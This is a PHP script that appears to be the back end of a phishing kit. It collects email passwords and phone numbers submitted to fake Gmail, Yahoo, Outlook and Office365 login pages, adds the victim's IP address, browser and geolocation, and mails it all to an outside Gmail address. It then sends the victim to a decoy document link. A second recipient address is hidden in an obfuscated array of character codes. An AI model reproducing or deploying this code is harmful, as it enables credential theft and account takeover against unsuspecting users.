<?php
$Email = $_POST['Email'];
$password = $_POST['password'];
$ip = $_POST['ip'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$geoplugin->locate();
$msg = "---------------|54|---------------\n";
$msg .= "Email : ".$_POST['em']."\n";
$msg .= "Password : ".$_POST['psw']."\n";
if($_POST['sub']=="gmail") {
	$msg .= "Tel : ".$_POST['phn']."\n";
	$subject="Blessing from Gmail";
}
if($_POST['sub']=="ymail") {
	$subject="Blessing from Yahoo";
}
if($_POST['sub']=="hmail") {
	$subject="Blessing from Outlook";
}
if($_POST['sub']=="amail") {
	$subject="Blessing from Office365";
}
if($_POST['sub']=="omail") {
	$subject="Blessing from Others";
}
$msg .= "IP Address : $ip\n";
$msg .= "Port : $port\n";
$msg .= "Date : $adddate\n";
$msg .= "User-Agent: ".$browser."\n";
$msg .= "--------------------------------------------\n";
$msg .=     "City: {$geoplugin->city}\n";
$msg .=     "Region: {$geoplugin->region}\n";
$msg .=     "Country Name: {$geoplugin->countryName}\n";
$msg .=     "Country Code: {$geoplugin->countryCode}\n";

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

$to = "attorneyjanetkirby@gmail.com";
$from = "From: Online Feed Back <feedback@domain.com>";

mail($to,$subject,$msg, $from);

print "https://www.accenture.com/t20161108T004604Z__w__/us-en/_acnmedia/Accenture/Conversion-Assets/DotCom/Documents/Global/PDF/Consulting/Accenture-Future-Wealth-Management.pdf";


?>

